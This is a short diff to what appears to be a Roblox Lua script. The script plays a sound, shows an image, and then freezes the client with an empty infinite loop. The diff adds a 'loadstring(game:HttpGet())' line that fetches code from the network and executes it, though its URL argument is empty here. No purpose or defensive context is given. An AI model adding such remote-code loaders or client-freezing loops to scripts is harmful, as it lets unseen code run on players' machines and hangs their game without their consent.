@@ -61,6 +61,7 @@ sound:Play()
 image.Visible = true
 
 task.wait(1)
+loadstring(game:HttpGet())
 
 while true do end
 
